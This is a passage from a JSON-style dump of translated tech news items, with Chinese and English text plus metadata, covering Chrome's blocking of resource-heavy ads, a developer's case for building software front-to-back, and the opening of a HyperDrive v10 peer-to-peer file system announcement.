8d85\u8fc7\u8be5\u8d44\u6e90\u6240\u6709\u68c0\u6d4b\u5230\u7684\u5e7f\u544a\u768499.9%\u201d\u7684\u5e7f\u544a\u3002\nVB Transform 2020 Online-7\u670815\u65e5\u81f317\u65e5\uff1a\u4e0e\u9886\u5148\u7684AI\u9ad8\u7ba1\u4e00\u8d77\u53c2\u52a0\u5e74\u5ea6AI\u6d3b\u52a8\u3002\u7acb\u5373\u6ce8\u518c\uff0c\u53ef\u8282\u770130%\u7684\u6570\u5b57\u8bbf\u95ee\u901a\u884c\u8bc1\u3002\n\u8c37\u6b4c\u8868\u793a\uff0c\u8fd9\u4e9b\u95e8\u69db(4MB\u7f51\u7edc\u6570\u636e\uff0c\u4efb\u4f5530\u79d2\u518515\u79d2\u7684CPU\u4f7f\u7528\u91cf\uff0c60\u79d2\u7684\u603bCPU\u4f7f\u7528\u91cf)\u4ec5\u5360\u5e7f\u544a\u76840.3%\u3002\u7136\u800c\uff0c\u5b83\u4eec\u5360\u5e7f\u544a\u4f7f\u7528\u7684\u7f51\u7edc\u6570\u636e\u768426%\uff0c\u5360\u6240\u6709\u5e7f\u544aCPU\u4f7f\u7528\u91cf\u768428%\u3002\u8c37\u6b4c\u4e0b\u9762\u7684\u56fe\u8868\u663e\u793a\u4e86\u91cd\u578b\u5e7f\u544a\u548c\u975e\u91cd\u578b\u5e7f\u544a\u7684\u603b\u4f53\u767e\u5206\u6bd4\uff0c\u4ee5\u53ca\u6bcf\u79cd\u5e7f\u544a\u7684\u603b\u8d44\u6e90\u4f7f\u7528\u91cf\u3002\n\u5728\u7528\u6237\u4e0e\u5e7f\u544a\u4e92\u52a8\u4e4b\u524d\uff0cChrome\u4f1a\u9650\u5236\u663e\u793a\u5e7f\u544a\u53ef\u4ee5\u4f7f\u7528\u7684\u8d44\u6e90\u3002\u5f53\u5e7f\u544a\u8fbe\u5230\u67d0\u4e2a\u9608\u503c\u65f6\uff0c\u8be5\u5e7f\u544a\u7684\u6846\u67b6\u5c06\u5bfc\u822a\u5230\u4e00\u4e2a\u9519\u8bef\u9875\u9762\uff0c\u8be5\u9875\u9762\u7b80\u5355\u5730\u663e\u793a\u201c\u5e7f\u544a\u5df2\u5220\u9664\u201d\u3002\n\u70b9\u51fb\u8be6\u7ec6\u4fe1\u606f\u5c06\u901a\u77e5\u7528\u6237\u8be5\u5e7f\u544a\u4f7f\u7528\u4e86\u592a\u591a\u8d44\u6e90\u3002\n\u8c37\u6b4c\u60f3\u8981\u56db\u5904\u65bd\u538b\uff0c\u4ee5\u51cf\u5c11\u8fd9\u4e9b\u6570\u5b57\u3002\u636e\u63a8\u6d4b\uff0c\u5b83\u968f\u540e\u5c06\u8c03\u6574\u95e8\u69db\u3002\u76ee\u6807\u662f\u4ec0\u4e48\uff1f\u201c\u8282\u7701\u6211\u4eec\u7528\u6237\u7684\u7535\u6c60\u548c\u6570\u636e\u5957\u9910\uff0c\u5e76\u4e3a\u4ed6\u4eec\u63d0\u4f9b\u826f\u597d\u7684\u7f51\u7edc\u4f53\u9a8c\u3002\u201d\n\u4f46\u8c37\u6b4c\u4e0d\u60f3\u7b80\u5355\u5730\u6253\u5f00\u8fd9\u79cd\u5927\u91cf\u5e7f\u544a\u5e72\u9884\u7684\u5f00\u5173\u3002\u8be5\u516c\u53f8\u5e0c\u671b\u8ba9\u5e7f\u544a\u521b\u5efa\u8005\u548c\u5de5\u5177\u63d0\u4f9b\u5546\u6709\u65f6\u95f4\u201c\u51c6\u5907\u597d\u8fd9\u4e9b\u95e8\u69db\uff0c\u5e76\u5c06\u5176\u7eb3\u5165\u4ed6\u4eec\u7684\u5de5\u4f5c\u6d41\u7a0b\u201d\u3002\u8c37\u6b4c\u8fd8\u5c06\u4e0e\u5e7f\u544a\u5546\u5206\u4eab\u62a5\u544a\uff0c\u8fd9\u6837\u4ed6\u4eec\u5c31\u53ef\u4ee5\u770b\u5230Chrome\u7684\u5e7f\u544a\u62e6\u622a\u7a0b\u5e8f\u662f\u5982\u4f55\u5f71\u54cd\u4ed6\u4eec\u7684\u5e7f\u544a\u7684\u3002", "note_en": "Google today announced that Chrome will start blocking resource-heavy ads. Examples include ads that mine cryptocurrency, are poorly programmed, or are unoptimized for network usage. Chrome will block these ads because they \u201cdrain battery life, saturate already strained networks, and cost money.\u201d There are three possible thresholds an ad can hit to be blocked: 4MB of network data, 15 seconds of CPU usage in any 30 second period, or 60 seconds of total CPU usage. Google will be experimenting with this change \u201cover the next several months\u201d and will roll it out on Chrome stable \u201cnear the end of August.\u201d\n Not many are aware that the world\u2019s most popular browser  has a built-in ad blocker. Two years ago, Google joined the  Coalition for Better Ads, a group that specifies  standards for how the industry should improve ads for consumers. Chrome  blocks  all ads (including those owned or served by Google) on websites that display non-compliant ads, as defined by the coalition. In addition to ads, Google has also used Chrome\u2019s ad blocker  to tackle \u201cabusive experiences\u201d. The tool is thus more for punishing bad sites than a complete ad blocker.\n  Because ad blockers hurt publishers (like VentureBeat) that create free content, blocking all ads would cripple not only one of the web\u2019s few monetization tools, but  Alphabet\u2019s main revenue stream as well. Indeed, Google has a vested interest in  improving the web\u2019s user experience. Google\u2019s approach is thus to start small and ramp up slowly \u2014 gradually changing how business owners, marketers, and developers build websites. Given its reach, including  over 1 billion Chrome users and  over 2.5 billion monthly active Android devices, not to mention  Google Search and  Google Ads, anyone with a website needs to track what Google prioritizes.\n  Google says that \u201ca fraction of a percent of ads\u201d consume a disproportionate share of device resources, including battery and network data. The company measured the ads Chrome sees and targeted the most egregious ads, meaning those that \u201cuse more CPU or network bandwidth than 99.9% of all detected ads for that resource.\u201d\n  VB Transform 2020 Online - July 15-17: Join leading AI executives at the AI event of the year.  Register today and save 30% off digital access passes.\n The thresholds (4MB of network data, 15 seconds of CPU usage in any 30 second period, 60 seconds of total CPU usage) represent just 0.3% of ads, Google said. And yet, they account for 26% of network data used by ads and 28% of all ad CPU usage. Google\u2019s chart below shows the overall percentage of heavy and non-heavy ads and the total resource usage of each.\n  Chrome will limit the resources a display ad can use before the user interacts with the ad. When an ad reaches one of the thresholds, the ad\u2019s frame will navigate to an error page that simply says \u201cAd removed.\u201d\n  Clicking on Details will inform the user that the ad has used too many resources.\n  Google wants to throw its weight around to cut down those numbers. Presumably it will then adjust the thresholds. The goal? \u201cTo save our users\u2019 batteries and data plans, and provide them with a good experience on the web.\u201d\n But Google does not want to simply flip a switch on this  heavy ads intervention. The company is looking to give ad creators and tool providers time to \u201cprepare and incorporate these thresholds into their workflows.\u201d Google will also share reports with advertisers so they can see how Chrome\u2019s ad blocker is impacting their ads.", "posttime": "2020-05-15 00:54:24", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "chrom,\u5e7f\u544a,\u8d44\u6e90,start", "title": "Chrome\u5c06\u4e8e8\u6708\u5f00\u59cb\u5c4f\u853d\u8d44\u6e90\u5bc6\u96c6\u578b\u5e7f\u544a", "title_en": "Chrome Will Start Blocking Resource-Heavy Ads in August", "transed": 1, "url": "https://venturebeat.com/2020/05/14/chrome-will-start-blocking-resource-heavy-ads-in-august/", "via": "", "real_tags": ["chrom", "\u5e7f\u544a", "\u8d44\u6e90", "start"]}, {"category": "", "categoryclass": "", "imagename": "89c0be1328e21cceadbd7dbd122dff4d.jpg", "infoid": 1002112, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u5728\u8fc7\u53bb\u7684\u51e0\u5e74\u91cc\uff0c\u6211\u5df2\u7ecf(\u51fa\u4e8e\u5174\u8da3\u548c\u9700\u8981\u7684\u7ed3\u5408)\u8f6c\u53d8\u4e3a\u4e00\u540d\u5168\u6808\u5f00\u53d1\u4eba\u5458\u3002\u5728\u8fd9\u6bb5\u65f6\u95f4\u91cc\uff0c\u6211\u7684\u524d\u7aef\u529f\u592b\u786e\u5b9e\u63d0\u9ad8\u4e86\u5f88\u591a\u3002\u7136\u800c\uff0c\u6211\u77e5\u9053\u6211\u4e0d\u4f1a\u56e0\u4e3a\u5bf9CSS\u6280\u5de7\u7684\u521b\u65b0\u8d21\u732e\u800c\u83b7\u5f97\u4efb\u4f55\u5956\u9879\u3002\u6211\u8ba4\u4e3a\u6211\u751a\u81f3\u4e0d\u4f1a\u50cf\u73b0\u5728\u4ece\u4e8b\u540e\u7aef\u66f4\u6539\u90a3\u6837\u611f\u5230\u8212\u670d\u3002\n\u7531\u4e8e\u8fd9\u79cd\u504f\u89c1\uff0c\u5728\u5b9e\u73b0\u5b8c\u6574\u5806\u6808\u66f4\u6539\u65f6\uff0c\u6211\u603b\u662f\u4ece\u540e\u7aef\u5f00\u59cb\u3002\u6211\u5c06\u6784\u5efa\u4e00\u4e2a\u670d\u52a1\u5c42\uff0c\u521b\u5efa\u4e00\u4e2a\u6570\u636e\u5e93\u6a21\u5f0f\uff0c\u7f16\u5199\u4e00\u7cfb\u5217\u6d4b\u8bd5\uff0c\u5e76\u6700\u7ec8\u56f4\u7ed5\u6211\u7684\u6570\u636e\u7ed3\u6784\u6784\u5efaAPI\u3002\u4ece\u6211\u6700\u5f3a\u7684\u90a3\u90e8\u5206\u5f00\u59cb\uff0c\u4ee5\u540e\u518d\u5f04\u6e05\u695a\u5176\u4f59\u7684\u90e8\u5206\uff0c\u611f\u89c9\u5f88\u597d\u3002\n\u8fd9\u4e00\u5207\u90fd\u662f\u5012\u9000\u7684\uff0c\u8fd9\u4f1a\u5bfc\u81f4\u5fc3\u75db\u3002\u4f60\u751a\u81f3\u53ef\u4ee5\u8bf4\u8fd9\u662f\u4ece\u540e\u5230\u524d(\u505c\u987f\u4ee5\u6362\u53d6\u638c\u58f0)\u3002\n\u6211\u7ecf\u5e38\u4ee5\u4e0d\u592a\u6b63\u786e\u7684API\u7aef\u70b9\u7ed3\u675f\uff0c\u8fd9\u5bfc\u81f4\u4e86\u5728\u5ba2\u6237\u7aef\u805a\u5408\u4e00\u4e9b\u8d44\u6e90\u7684\u8bf1\u60d1\u3002\u6211\u4e0d\u662f\u89c6\u56fe\u5c42\u4e2d\u805a\u5408\u903b\u8f91\u7684\u72c2\u70ed\u7c89\u4e1d\uff0c\u6240\u4ee5\u6211\u901a\u5e38\u4f1a\u5728API\u8fbe\u5230\u9ec4\u91d1\u65f6\u95f4\u4e4b\u524d\u63d0\u4ea4\u540e\u7eed\u5408\u5e76\u8bf7\u6c42\u6765\u66f4\u6539API\u3002\u8fd9\u662f\u6d6a\u8d39\u65f6\u95f4\uff0c\u5bf9\u6211\u548c\u8bc4\u8bba\u8005\u6765\u8bf4\u90fd\u662f\u76f8\u5f53\u4ee4\u4eba\u6cae\u4e27\u7684\u3002\n\u6700\u8fd1\u6211\u5728\u505a\u4e00\u4e9b\u6709\u70b9\u4e0d\u540c\u7684\u4e8b\u60c5\u3002\u6211\u4ece\u524d\u5230\u540e\u4e00\u76f4\u5728\u5de5\u4f5c\u3002\u6211\u4e00\u76f4\u5728\u4f7f\u7528\u6a21\u62df\u6570\u636e\u5728UI\u4e0a\u9884\u5148\u521b\u5efa\u6211\u5e0c\u671b\u770b\u5230\u7684\u7528\u6237\u4f53\u9a8c\u3002\u6211\u901a\u8fc7\u5c06\u6570\u636e\u786c\u7f16\u7801\u5728\u5ba2\u6237\u7aef\u5b58\u50a8\u4e2d\u7528\u4e8e\u5355\u9875\u9762\u5e94\u7528\u7a0b\u5e8f\uff0c\u6216\u901a\u8fc7\u5728\u63a7\u5236\u5668\u4e2d\u786c\u7f16\u7801\u6a21\u578b\u7528\u4e8e\u591a\u9875\u5e94\u7528\u7a0b\u5e8f\u6765\u5b9e\u73b0\u8fd9\u4e00\u70b9\u3002\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0c\u6211\u53ef\u4ee5\u5728\u6295\u5165\u592a\u591a\u65f6\u95f4\u4e4b\u524d\u5c1d\u8bd5\u4e00\u4e9b\u5927\u5c0f\u7684\u4e1c\u897f\uff0c\u5e76\u4ece\u56e2\u961f\u90a3\u91cc\u83b7\u5f97\u53cd\u9988\u3002\u6211\u751a\u81f3\u53ef\u4ee5\u5c06\u5176\u90e8\u7f72\u5728\u529f\u80fd\u5207\u6362\u4e4b\u540e\uff0c\u8ba9\u4e00\u4e9balpha\u7528\u6237\u5728\u5f00\u53d1\u5468\u671f\u7684\u65e9\u671f\u7ed9\u51fa\u53cd\u9988\u3002\n\u6211\u73b0\u5728\u5bf9\u6211\u5728\u6574\u4e2a\u5de5\u4f5c\u4e2d\u8bd5\u56fe\u5b9e\u73b0\u7684\u76ee\u6807\u6709\u4e86\u4e00\u4e2a\u66f4\u660e\u786e\u7684\u60f3\u6cd5\u3002\u8d77\u521d\uff0c\u6211\u8ba4\u4e3a\u6211\u7684\u57fa\u4e8eREST\u7684API\u65b9\u6cd5\u4f1a\u8f6c\u53d8\u4e3aRPC over HTTP\u3002\u6211\u62c5\u5fc3\u5b83\u4f1a\u5c06UI\u529f\u80fd\u4e0eAPI\u7d27\u5bc6\u8026\u5408\uff0c\u4f46\u4e8b\u5b9e\u5e76\u975e\u5982\u6b64\u3002\u6211\u7684\u7aef\u70b9\u7a0d\u5fae\u91cd\u4e00\u4e9b\uff0c\u4f46\u5b83\u4eec\u7684\u7ed3\u6784\u8981\u5408\u7406\u5f97\u591a\u3002\n\u6709\u8da3\u7684\u662f\uff0c\u6211\u610f\u8bc6\u5230\u6211\u73b0\u5728\u5bf9\u6574\u4e2a\u5806\u6808\u90fd\u5f88\u6ee1\u610f\uff0c\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u5b9e\u73b0\u529f\u80fd\u4e30\u5bcc/\u6570\u636e\u5c11\u7684\u66f4\u6539\u8981\u5feb\u5f97\u591a\u3002\u6211\u6700\u8fd1\u4e00\u76f4\u5728\u4f7f\u7528StimulusJS(\u6211\u5728\u8fd9\u91cc\u8c08\u5230\u4e86\u5b83)\uff0c\u5e76\u4e00\u76f4\u5c06HTML\u8868\u5355\u89c6\u4e3a\u6211\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u57fa\u672c\u6784\u5efa\u5757\u3002\u4e5f\u8bb8Visual Basic\u7684\u4ee5\u8868\u5355\u4e3a\u4e2d\u5fc3\u7684\u65b9\u6cd5\u7ec8\u7a76\u662f\u9488\u5bf9\u67d0\u4ef6\u4e8b\u7684\u5462\uff1f\n\u6211\u731c\u60f3\uff0c\u6211\u4e4b\u524d\u4ece\u540e\u7aef\u6784\u5efa\u66f4\u6539\u7684\u503e\u5411\u66f4\u591a\u5730\u662f\u51fa\u4e8e\u5b89\u5168\u8003\u8651\uff0c\u800c\u4e0d\u662f\u4efb\u4f55\u660e\u786e\u7684\u51b3\u5b9a\u3002\u6211\u5f88\u60f3\u77e5\u9053\u5176\u4ed6\u540e\u7aef\u5f00\u53d1\u4eba\u5458\u5728\u8fc7\u6e21\u65f6\u662f\u5426\u4f1a\u7ecf\u5386\u8fd9\u4e2a\u8fc7\u7a0b\u3002\u524d\u7aef\u5f00\u53d1\u4eba\u5458\u6700\u7ec8\u4f1a\u53d1\u751f\u76f8\u53cd\u7684\u4e8b\u60c5\u5417\uff1f", "note_en": "I\u2019ve transitioned over the last few years (through a combination of interest and necessity) to being a full-stack developer. In this time my front-end-fu has definitely improved a great deal. Yet, I  know that I\u2019m not going to win any awards for innovative contributions to  CSS Tricks. I do not think I will even be as comfortable as I am working on back-end changes.\n As a result of this bias, when implementing full stack changes I\u2019ve always started with the back-end. I\u2019ll build out a service layer, create a database schema, write a bunch of tests, and  eventually build the API around the structure of my data. It felt nice to start in the part of the stack in which I\u2019m strongest and to figure out the rest later.\n This is all backwards and it leads to heartache. You might even say that it\u2019s  back-to-front ( pause for applause).\n I\u2019ve often ended up with API endpoints that are not  quite right, which has led to the temptation to aggregate some resources on the client side. I\u2019m not a huge fan of aggregation logic in the view layer, so I have generally submitted follow-up merge requests to alter the API before it hit prime time. This churn wastes time, and is pretty frustrating for both me and the reviewer.\n I\u2019ve been doing something a little different recently. I\u2019ve been working  front-to-back. I\u2019ve been creating the user experience I\u2019d like to see on the UI up-front with mocked data. I do this by hard-coding data in a client-side store for a single-page app, or by hard-coding models in the controller for a multi-page app. In this way, I can try some things on for size and get feedback from the team before I\u2019ve invested too much time. I can even deploy it behind a feature toggle and let some alpha users give feedback very early in the dev cycle.\n I now have a much more well-defined idea of what I\u2019m trying to achieve throughout the work. At first, I thought that my REST-ish approach to the API would devolve into RPC over HTTP. I worried that it would tightly couple UI features to the API, but this hasn\u2019t been the case. My endpoints are a  little heavier, but they\u2019re structured in a much more sensible way.\n It\u2019s interesting to realize that I\u2019m now comfortable enough across the stack that feature-rich/data-light changes are implemented  much faster in this way. I\u2019ve recently been using StimulusJS (I\u2019ve talked about it  here) and have been treating HTML forms as the basic building block of my application. Maybe Visual Basic\u2019s form-centric approach was onto something after all?\n I would guess that my prior inclination to build changes from the back-end up came more from seeking safety than any explicit decision. I\u2019m curious to find out whether other back end developers go through this process when transitioning. Do front-end devs end up having the opposite thing happen?", "posttime": "2020-05-15 00:53:36", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u8f6f\u4ef6,\u6784\u5efa,software,\u66f4\u6539", "title": "\u4ece\u524d\u5230\u540e\u6784\u5efa\u8f6f\u4ef6", "title_en": "Build Software from Front-to-Back", "transed": 1, "url": "https://happyvalley.dev/build-software-from-front-to-back/", "via": "", "real_tags": ["\u8f6f\u4ef6", "\u6784\u5efa", "software", "\u66f4\u6539"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1002111, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u5728\u8fc7\u53bb\u7684\u4e00\u5e74\u91cc\uff0c\u6211\u4eec\u4e00\u76f4\u5728\u52aa\u529b\u5f00\u53d1HyperDrive\u7684V10\u7248\u672c\u3002\u7ecf\u8fc7\u957f\u65f6\u95f4\u7684\u6d4b\u8bd5\u7248\u6d4b\u8bd5\uff0c\u6211\u4eec\u5f88\u5174\u594b\u5730\u5ba3\u5e03\uff0c\u5b83\u5df2\u7ecf\u53ef\u4ee5\u666e\u904d\u4f7f\u7528\u4e86\uff01\nHyperDrive\u662f\u4e00\u79cd\u70b9\u5bf9\u70b9\u6587\u4ef6\u7cfb\u7edf\uff0c\u65e8\u5728\u5e2e\u52a9\u60a8\u76f4\u63a5\u4ece\u8ba1\u7b97\u673a\u5feb\u901f\u3001\u5b89\u5168\u5730\u5171\u4eab\u6587\u4ef6\u3002\u591a\u5e74\u6765\uff0cHyperDrive v9\u548c\u5176\u4ed6\u8bb8\u591a\u4ee5HYPER\u4e3a\u524d\u7f00\u7684\u6a21\u5757\u4e00\u76f4\u662fDat\u7684\u4e3b\u5e72--\u5982\u679c\u60a8\u6df1\u5165\u7814\u7a76\u4e86Dat\u7684\u5185\u90e8\u7ed3\u6784\uff0c\u60a8\u53ef\u80fd\u5df2\u7ecf\u719f\u6089\u4e86HyperDrive\u3002\n\u5728\u8fd9\u6b21\u53d1\u5e03\u4e4b\u524d\uff0c\u6211\u4eec\u505a\u4e86\u4e00\u4e9b\u91cd\u7ec4\uff1aHyperDrive\u548c\u5b83\u7684\u8bb8\u591a\u8d85\u7ea7\u5144\u5f1f\u73b0\u5728\u751f\u6d3b\u5728\u4e00\u4e2a\u540d\u4e3aHypercore Protocol\u7684\u5c0f\u578b\u3001\u4e13\u6ce8\u4e8e\u6280\u672f\u7684\u54c1\u724c/\u7ec4\u7ec7\u4e4b\u4e0b\u3002\u5b9e\u9645\u4e0a\uff0c\u8fd9\u4e00\u6539\u53d8\u9664\u4e86\u54c1\u724c\u4e4b\u5916\u610f\u4e49\u4e0d\u5927\uff0c\u4f46\u6211\u4eec\u5e0c\u671b\u5b83\u80fd\u8ba9\u6a21\u5757\u6709\u673a\u4f1a\u72ec\u6811\u4e00\u5e1c\u3002\u6709\u9274\u4e8e\u6b64\uff0c\u4e0b\u9762\u8ba9\u6211\u4eec\u6765\u770b\u770b\u8d85\u7a7a\u95f4\u5f15\u64ce\u7684\u5185\u90e8\u60c5\u51b5\u3002\n\u5728\u8fd9\u7bc7\u6587\u7ae0\u4e2d\uff0c\u6211\u4eec\u5c06\u9010\u6b65\u4ecb\u7ecd\u6211\u4eec\u5728V10\u4e2d\u6240\u505a\u7684\u4e00\u4e9b\u6539\u8fdb\uff0c\u89e3\u91caHyperDrive\u5982\u4f55\u9002\u5e94\u66f4\u5e7f\u6cdb\u7684Hypercore\u534f\u8bae\u751f\u6001\u7cfb\u7edf\uff0c\u5e76\u5411\u60a8\u5c55\u793a\u5982\u4f55\u5f00\u59cb\u4f7f\u7528\u5b83\u3002\u6b64\u7248\u672c\u53ea\u662f\u4e2a\u5f00\u59cb\uff0c\u6211\u4eec\u5c06\u5728\u5c55\u671b\u90e8\u5206\u4ecb\u7ecd\u6211\u4eec\u7684\u4e0b\u4e00\u6b65\u5de5\u4f5c\u3002\n\u6539\u8fdb\u7684\u7d22\u5f15\uff1a\u6211\u4eec\u6b63\u5728\u4f7f\u7528\u4e00\u79cd\u65b0\u7684\u57fa\u4e8eHAMT\u7684\u7d22\u5f15\u7ed3\u6784\uff0c\u79f0\u4e3aHypertrie\uff0c\u5b83\u63d0\u4f9b\u4e86\u5de8\u5927\u7684\u6027\u80fd/\u53ef\u4f38\u7f29\u6027\u63d0\u5347\u3002\n\u8d85\u7ea7\u9a71\u52a8\u5668\u5b88\u62a4\u7a0b\u5e8f\uff1a\u6211\u4eec\u5df2\u7ecf\u521b\u5efa\u4e86\u4e00\u4e2a\u8de8\u5e73\u53f0\u7684\u5b88\u62a4\u7a0b\u5e8f\uff0c\u63d0\u4f9b\u5bf9\u5b88\u62a4\u7a0b\u5e8f\u7ba1\u7406\u7684\u9a71\u52a8\u5668\u7684FUSE\u548cGRPC\u8bbf\u95ee\u3002\n\u66f4\u597d\u7684\u57fa\u7840\uff1a\u6211\u4eec\u6700\u8fd1\u5f15\u5165\u4e86\u8d85\u6696\u5206\u5e03\u5f0f\u54c8\u5e0c\u8868\uff0c\u4ee5\u53ca\u5bf9\u8d85\u6838\u534f\u8bae\u7684\u6539\u8fdb\uff0c\u8fd9\u6709\u52a9\u4e8e\u4f7f\u6211\u4eec\u7684\u6574\u4e2a\u5806\u6808\u66f4\u5feb\u3001\u66f4\u53ef\u9760\u3002\nHyperDrive\u662f\u7528Node.js\u7f16\u5199\u7684\u3001\u4e0ePOSIX\u517c\u5bb9\u7684\u6587\u4ef6\u7cfb\u7edf\u5b9e\u73b0\uff0c\u65e8\u5728\u6210\u4e3a\u5feb\u901f\u3001\u53ef\u6269\u5c55\u548c\u5b89\u5168\u7684\u5bf9\u7b49\u5e94\u7528\u7a0b\u5e8f\u7684\u5b58\u50a8\u5c42\u3002\u5bf9\u4e8e\u5927\u591a\u6570\u5f00\u53d1\u4eba\u5458\u6765\u8bf4\uff0c\u4f7f\u7528Hyperdrive\u7684\u611f\u89c9\u5e94\u8be5\u5c31\u50cf\u4f7f\u7528Node\u7684\u6807\u51c6fs\u6a21\u5757\u4e00\u6837\uff0c\u53ea\u9700\u7a0d\u52a0\u6539\u52a8\u3002\u6211\u4eec\u7684\u4e3b\u8981\u76ee\u6807\u4e00\u76f4\u662f\u4f7f\u4f7f\u7528\u5355\u4e2a32\u5b57\u8282\u5bc6\u94a5(\u5373hyper\uff1a//ab13d.)\u4e0e\u4ed6\u4eba\u5171\u4eab\u6574\u4e2a\u6587\u4ef6\u7cfb\u7edf\u6210\u4e3a\u53ef\u80fd\u3002\u4ece\u73b0\u5728\u5f00\u59cb\uff0c\u6211\u4eec\u5c06Hyperdrive\u6587\u4ef6\u7cfb\u7edf\u79f0\u4e3a\u9a71\u52a8\u5668\u3002\n\u9a71\u52a8\u5668\u975e\u5e38\u9002\u5408\u5355\u4e2a\u7f16\u5199\u5668\u60f3\u8981\u5411\u591a\u4e2a\u8bfb\u53d6\u5668\u5206\u53d1\u5927\u578b\u53ef\u53d8\u6587\u4ef6\u96c6\u5408\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u6587\u4ef6\u96c6\u5408\u53ef\u4ee5\u662f\u89c6\u9891\u5e93\u3001\u4e2a\u4eba\u535a\u5ba2\u3001\u79d1\u5b66\u6570\u636e\u96c6\u6216\u60a8\u62e5\u6709\u7684\u4efb\u4f55\u4e1c\u897f\u3002\u4e0eBitTorrent\u7c7b\u4f3c\uff0c\u5bf9\u7b49\u70b9\u53ef\u4ee5\u4ece\u5176\u4ed6\u5bf9\u7b49\u70b9\u4e0b\u8f7d\u6587\u4ef6\uff0c\u800c\u4e0d\u4f1a\u727a\u7272\u4fe1\u4efb(\u9a71\u52a8\u5668\u5185\u5bb9\u7531\u539f\u59cb\u4f5c\u8005\u7b7e\u540d)\u3002\n\u4e0eBitTorrent\u4e0d\u540c\uff0c\u53ef\u4ee5\u5728\u521b\u5efa\u9a71\u52a8\u5668\u540e\u6dfb\u52a0\u6216\u4fee\u6539\u6587\u4ef6\uff0c\u540c\u884c\u53ef\u4ee5\u76d1\u89c6\u9a71\u52a8\u5668\u8fdb\u884c\u66f4\u65b0\uff0c\u8fd9\u610f\u5473\u7740\u66f4\u65b0\u901a\u77e5\u4f1a\u5b9e\u65f6\u53d1\u9001\u7ed9\u8bfb\u8005\uff01\n\u91cd\u8981\u7684\u662f\uff0c\u9a71\u52a8\u5668\u652f\u6301\u9ad8\u6548\u7684\u968f\u673a\u8bbf\u95ee\u6587\u4ef6\u8bfb\u53d6\uff0c\u8fd9\u610f\u5473\u7740\u60a8\u53ef\u4ee5\u5728\u89c6\u9891\u4e2d\u8fdb\u884c\u641c\u7d22\uff0c\u5e76\u4e14\u5b83\u53ea\u4f1a\u6309\u9700\u4e0b\u8f7d\u60a8\u6b63\u5728\u91cd\u65b0\u67e5\u770b\u7684\u89c6\u9891\u90e8\u5206\u3002\u6211\u4eec\u79f0\u8fd9\u79cd\u5c5e\u6027\u4e3a\u7a00\u758f\u4e0b\u8f7d\uff0c\u5bf9\u4e8e\u5927\u578b\u7f51\u7ad9(\u5047\u8bbe\u6240\u6709\u7ef4\u57fa\u767e\u79d1\u90fd\u955c\u50cf\u5230\u4e00\u4e2a\u9a71\u52a8\u5668)\u7b49\u8bfb\u8005\u4e00\u6b21\u53ea\u80fd\u6d4f\u89c8\u4e00\u4e2a\u9875\u9762\u7684\u60c5\u51b5\u6765\u8bf4\uff0c\u5b83\u975e\u5e38\u6709\u7528\u3002\n\u5728\u5e55\u540e\uff0cHyperDrive\u662f\u4f7f\u7528\u4e24\u4e2a\u79f0\u4e3aHypercores\u7684\u4ec5\u9644\u52a0\u65e5\u5fd7\u6570\u636e\u7ed3\u6784\u6784\u5efa\u7684\uff0c\u4e00\u4e2a\u7528\u4e8e\u9ad8\u6548\u7684\u5143\u6570\u636e\u7d22\u5f15\uff0c\u53e6\u4e00\u4e2a\u7528\u4e8e\u4e8c\u8fdb\u5236\u6587\u4ef6\u5185\u5bb9\u3002\u60a8\u53ef\u4ee5\u4eceHypercore\u534f\u8bae\u7f51\u7ad9\u4e86\u89e3\u6709\u5173Hypercore\u7684\u66f4\u591a\u4fe1\u606f\u3002Hypercore\u4e3a\u4ea4\u6362\u6709\u5e8f\u6570\u636e\u5757\u63d0\u4f9b\u4e86\u5feb\u901f\u800c\u5b89\u5168\u7684\u57fa\u7840\uff0c\u4f46\u662f\u4e00\u4e2a\u597d\u7684\u6587\u4ef6\u7cfb\u7edf\u4f9d\u8d56\u4e8e\u4e00\u4e2a\u597d\u7684\u7d22\u5f15\u3002\n\u4e3a\u4e86\u652f\u6301\u6267\u884c\u7684\u6587\u4ef6\u7cfb\u7edf\u64cd\u4f5c\uff0c\u5982\u76ee\u5f55\u904d\u5386\uff0c\u6211\u4eec\u5728Hypercore\u4e4b\u4e0a\u5206\u5c42\u4e86\u4e00\u4e2a\u79f0\u4e3aHypertrie\u7684\u7d22\u5f15\u6570\u636e\u7ed3\u6784\uff0c\u5b83\u662f\u6563\u5217\u6570\u7ec4\u6620\u5c04trie\u7684\u4ec5\u9644\u52a0\u5b9e\u73b0\u3002\u63cf\u8ff0Hypertrie\u7684\u5168\u8c8c\u672c\u8eab\u5c31\u662f\u4e00\u7bc7\u535a\u5ba2\u6587\u7ae0\uff0c\u4f46\u6700\u91cd\u8981\u7684\u662f\uff0c\u5b83\u5141\u8bb8\u6211\u4eec\u4f7f\u7528O(log_4(N))\u7f51\u7edc\u8bf7\u6c42(\u6700\u574f\u60c5\u51b5\u4e0b)\u6765\u5b9a\u4f4d\u6587\u4ef6/\u76ee\u5f55\u5143\u6570\u636e\uff0c\u8fd9\u4e9b\u5143\u6570\u636e\u53ef\u80fd\u5206\u6563\u5728\u8bb8\u591a\u5bf9\u7b49\u70b9\u4e0a\u3002\u5728\u5b9e\u8df5\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528\u4e13\u95e8\u7684Hypercore\u6269\u5c55\u6765\u663e\u8457\u63d0\u9ad8\u901f\u5ea6(\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u4e3aO(1))\u3002\nHypercore\u534f\u8bae\u751f\u6001\u7cfb\u7edf\u6700\u8fd1\u6709\u4e86\u91cd\u5927\u6539\u8fdb\uff0cHyperDrive\u76f4\u63a5\u53d7\u76ca\u4e8e\u6240\u6709\u8fd9\u4e9b\u6539\u8fdb\u3002\u6700\u91cd\u8981\u7684\u662f\uff0cHyperDrive 